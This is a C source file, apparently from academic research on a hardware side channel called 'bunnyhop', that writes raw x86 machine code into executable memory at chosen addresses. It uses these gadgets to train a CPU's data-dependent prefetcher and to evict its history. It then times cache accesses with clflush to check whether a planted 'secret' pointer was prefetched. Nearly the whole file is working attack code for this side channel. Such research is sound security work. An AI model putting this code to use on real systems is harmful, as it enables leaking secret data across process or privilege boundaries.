#include "bunnyhop.h"

#define LOW_MASK 0x7FFFFFFFF000
#define PAGELEN 4096
#define PAGEMASK 0xFFF

void free_buf(void *buffer, uint64_t len); 

/* GLOBAL DDP ITEMS TO AVOID PASSING ARGS */
bhfunc training_gadget;
bhfunc_load load_gadget_ddp; 
uint64_t **training_aop; 
uint64_t *test_aop;
uint64_t *garbage_aop;

/* GLOBAL DDP RESET ITEMS */
bhfunc ddp_eviction_gadgets[NUM_DDP_EVICTION_ITEMS];
uint64_t *ddp_eviction_aop[NUM_DDP_EVICTION_ITEMS];

#define LOAD_SECTION 13
#define BOTTOM_SECTION (LOAD_SECTION + 7)

bhfunc gen_access_aop(uint64_t addr, int size) { // TODO copy gen_test_load with i++
  assert(size >= 23);
  unsigned char *buffer = (unsigned char *) create_buffer(addr, size);

  bhfunc func = (bhfunc)buffer; 
  // "push   %r13\n"
  buffer[0] = 0x41; buffer[1] = 0x55; 
  // "push   %r12\n"
  buffer[2] = 0x41; buffer[3] = 0x54; 
  // "xor    %r12,%r12\n"
  buffer[4] = 0x4d; buffer[5] = 0x31; buffer[6] = 0xe4;
  // "xor    %r13,%r13\n"
  buffer[7] = 0x4d; buffer[8] = 0x31; buffer[9] = 0xed;
  // "mov    %rdi,%r11\n"
  buffer[10] = 0x49; buffer[11] = 0x89; buffer[12] = 0xfb; 
  // "1:\n"
  // "mov    (%r11,%r12,8),%rax\n"
  buffer[LOAD_SECTION + 0] = 0x4b; buffer[LOAD_SECTION + 1] = 0x8b; buffer[LOAD_SECTION + 2] = 0x04; buffer[LOAD_SECTION + 3] = 0xe3;
  // lfence
  buffer[LOAD_SECTION + 4] = 0x0f; buffer[LOAD_SECTION + 5] = 0xae; buffer[LOAD_SECTION + 6] = 0xe8; 
  // "or     (%rax),%rdx\n"
  buffer[BOTTOM_SECTION + 0] = 0x48; buffer[BOTTOM_SECTION + 1] = 0x0b; buffer[BOTTOM_SECTION + 2] = 0x10; 
  // "add    %rcx,%r12\n"
  buffer[BOTTOM_SECTION + 3] = 0x49; buffer[BOTTOM_SECTION + 4] = 0x01; buffer[BOTTOM_SECTION + 5] = 0xcc;
  // "add    $0x1,%r13\n"
  buffer[BOTTOM_SECTION + 6] = 0x49; buffer[BOTTOM_SECTION + 7] = 0x83; buffer[BOTTOM_SECTION + 8] = 0xc5; buffer[BOTTOM_SECTION + 9] = 0x01; 
  // "cmp    %rsi,%r13\n"
  buffer[BOTTOM_SECTION + 10] = 0x49; buffer[BOTTOM_SECTION + 11] = 0x39; buffer[BOTTOM_SECTION + 12] = 0xf5;
  // "jl     1b\n"
  // buffer[BOTTOM_SECTION + 13] = 0x7c; buffer[BOTTOM_SECTION + 14] = 0xed; 
  buffer[BOTTOM_SECTION + 13] = 0x7c; buffer[BOTTOM_SECTION + 14] = 0xea; 
  // "pop    %r12\n"
  buffer[BOTTOM_SECTION + 15] = 0x41; buffer[BOTTOM_SECTION + 16] = 0x5c;
  // "and    %rdx,%rax\n"
  buffer[BOTTOM_SECTION + 17] = 0x48; buffer[BOTTOM_SECTION + 18] = 0x89; buffer[BOTTOM_SECTION + 19] = 0xd0;
  // "pop    %r13\n"
  buffer[BOTTOM_SECTION + 20] = 0x41; buffer[BOTTOM_SECTION + 21] = 0x5d;
  //ret 
  buffer[BOTTOM_SECTION + 22] = 0xc3; 

  // mprotect
  mprotect(addr & LOW_MASK, 2 * PAGELEN, PROT_EXEC);

  return func;
}

bhfunc_load gen_test_load(uint64_t addr, uint64_t size) {
  assert(size >= 20);
  unsigned char *buffer = (unsigned char *) create_buffer(addr, size);
  int i = 0; 
  bhfunc_load func = (bhfunc_load)buffer; 

  // cmp    $0x1,%rsi
  buffer[i++] = 0x48; buffer[i++] = 0x83; buffer[i++] = 0xfe; buffer[i++] = 0x01; 
  //  je     401160 <my_access_aop+0x10> je 1f 
  buffer[i++] = 0x74; buffer[i++] = 0x0a;
  // mfence
  buffer[i++] = 0x0f; buffer[i++] = 0xae; buffer[i++] = 0xf0;
  // mov    (%rdi),%rax
  buffer[i++] = 0x48; buffer[i++] = 0x8b; buffer[i++] = 0x07;
  // mfence
  buffer[i++] = 0x0f; buffer[i++] = 0xae; buffer[i++] = 0xf0; 
  // ret
  buffer[i++] = 0xc3;
  // mfence MARK label 1f here 
  buffer[i++] = 0x0f; buffer[i++] = 0xae; buffer[i++] = 0xf0;
  // mov    (%rdi),%rax <-- train this guy (+ 19)
  buffer[i++] = 0x48; buffer[i++] = 0x8b; buffer[i++] = 0x07;
  //ret
  buffer[i++] = 0xc3;

  // mprotect
  mprotect(addr & LOW_MASK, 2 * PAGELEN, PROT_EXEC);

  return func;
}

void *create_buffer(uint64_t addr, int size) {
  void * buffer = (void *)mmap ( (void*)(addr & LOW_MASK), size + PAGELEN,  // add 1 extra page of memory to the request for the page alignment
			     PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE,
			     -1, 0 );
  if (buffer == MAP_FAILED) {
    printf ("Fail to allocate memory\n");
  } 
  return buffer + (addr & PAGEMASK); // align to page boundary 
}

void free_bh_func(void *addr, int size) {
  free_buf(addr, size);
}

void free_buf(void *buffer, uint64_t len) {
  uintptr_t start = (uintptr_t)buffer;
  uint64_t base = start & PAGEMASK;
  uint64_t length = len + PAGELEN;  // one extra page is always requested to align to page boundary 
  munmap((void *)base, length);
}

void init_bunnyhop(uint64_t target_pc) {
  uint64_t buffer_size = 1<<20; 

  // generate gadgets 
  load_gadget_ddp = gen_test_load(COLLISION_FUNC_START(DEFAULT_BASE + DEFAULT_BASE_ADDR_INCREMENT, target_pc-6), 300); // want them as close as possible to reduce noise? 
  training_gadget = gen_access_aop(COLLISION_FUNC_START(DEFAULT_BASE, target_pc), 300);

  // training buffer  
  uint64_t *training_buffer = malloc(sizeof(uint64_t) * buffer_size * 8);
  for(uint64_t i = 0; i < buffer_size * 8; i+=8) 
    training_buffer[i] = rand();

  // training aop set up
  training_aop = malloc(max(sizeof(uint64_t *) * TRAINING_SIZE, sizeof(uint64_t *) * STRIDE_TO_SET * STRIDE_TRAINING_LEN));
  for(int i = 0; i < TRAINING_SIZE; i++)
    training_aop[i] = &training_buffer[(rand() % buffer_size) * 8];
  for(int i = 0; i < STRIDE_TRAINING_LEN; i++) // stride setting mechanism 
    training_aop[i * STRIDE_TO_SET] = &training_buffer[(rand() % buffer_size) * 8];

  // test aop 
  test_aop = malloc(sizeof(uint64_t *) * (SECRET_LOC_IN_TEST_AOP + 1) + KB(512));
  test_aop = (uint64_t *)((KB(256) - ((uint64_t)test_aop % KB(256))) + (char *)test_aop);
  assert((uint64_t)test_aop % KB(256) == 0);
  for(int i = 0; i < SECRET_LOC_IN_TEST_AOP + 1; i++)
    test_aop[i] = rand(); 

  // Create eviction items 
  uint64_t cur_evict_pc = target_pc - 7; 
  int i = 0; 
  for(int cnt = 0; cnt < NUM_DDP_EVICTION_ITEMS; cnt++) {
    if(cur_evict_pc == target_pc) { // rollback don't want to double train 
      cnt--;
      cur_evict_pc++; 
      continue; 
    } 

    // create bhfunc
    ddp_eviction_gadgets[i] = gen_access_aop(COLLISION_FUNC_START(DEFAULT_BASE + (DEFAULT_BASE_ADDR_INCREMENT * (5 + i)), cur_evict_pc), 300);

    // allocate aop
    ddp_eviction_aop[i] = malloc(sizeof(uint64_t *) * DDP_EVICTION_AOP_SIZE); 
    for(int j = 0; j < DDP_EVICTION_AOP_SIZE; j++)
      ddp_eviction_aop[i][j] = (uint64_t)&training_buffer[(rand() % buffer_size) * 8];

    // update
    i++; 
    cur_evict_pc++;
  }

  // Garbage AoP 
  garbage_aop = malloc(1024 * sizeof(uint64_t));
  for(int i = 0; i < 1024; i++) 
    garbage_aop[i] = rand();

  // quick check for eviction
  volatile uint64_t *ptr_under_test = malloc(sizeof(uint64_t));
  *ptr_under_test = 0x5A; 
  test_aop[SECRET_LOC_IN_TEST_AOP] = (uint64_t)ptr_under_test; 
  uint64_t __trash = 0; 

  // test for proper training 
  for(int k = 0; k < BUNNYHOP_INIT_TRIALS; k++) {
    sleep(0);
    __trash = training_gadget((uint64_t *)training_aop, TRAINING_SIZE, __trash, 1); 
    __trash = clflush((uint64_t *)ptr_under_test, __trash); 
    bh_set_stride(load_gadget_ddp, training_aop, STRIDE_TO_SET);
    asm volatile("mfence\n" ::: "cc");
    load_gadget_ddp(test_aop, 1);
    __trash = c_sleep(1500, __trash);
    asm volatile("mfence\n" ::: "cc");
    // assert(time_access((uint64_t *)ptr_under_test, __trash) < 50 && "[FAILED] BUNNYHOP TRAINING CHECK");
  }
  printf("[PASS] PASSED BUNNY HOP TRAINING CHECKS\n");

  // Test eviction
  for(int k = 0; k < BUNNYHOP_INIT_TRIALS; k++) {
    sleep(0);
    __trash = training_gadget((uint64_t *)training_aop, TRAINING_SIZE, __trash, 1); 
    __trash = clflush((uint64_t *)ptr_under_test, __trash); 
    bh_set_stride(load_gadget_ddp, training_aop, STRIDE_TO_SET);
    asm volatile("mfence\n" ::: "cc");
    for(int i = 0; i < NUM_DDP_EVICTION_ITEMS; i++)
			__trash = ddp_eviction_gadgets[i](ddp_eviction_aop[i], DDP_EVICTION_AOP_SIZE, __trash, 1);
    asm volatile("mfence\n" ::: "cc");
    load_gadget_ddp(test_aop, 1);
    __trash = c_sleep(1500, __trash);
    asm volatile("mfence\n" ::: "cc");
    assert(time_access((uint64_t *)ptr_under_test, __trash) > 150 && "[FAILED] BUNNYHOP EVICTION CHECK");
  }
  printf("[PASS] PASSED BUNNY HOP EVICTION CHECKS\n");
  printf("[OK] ALL BUNNYHOP GOOD TO GO\n");

  // free 
  free(ptr_under_test); ptr_under_test = 0;
}

inline void reset_ddp_hist(bhfunc_load f, uint64_t *garbage) {
  for(uint64_t i = 0; i < DDP_HISTORY_RESET_LEN; i++)
    f(garbage + i, 1); 
}

inline void bh_set_stride(bhfunc_load f, uint64_t *aop, uint64_t stride) {
  for(int i = 0; i < STRIDE_TRAINING_LEN; i++) {
    _mm_lfence();
    f(aop + (i * stride), 1); // activate ddp
  }
}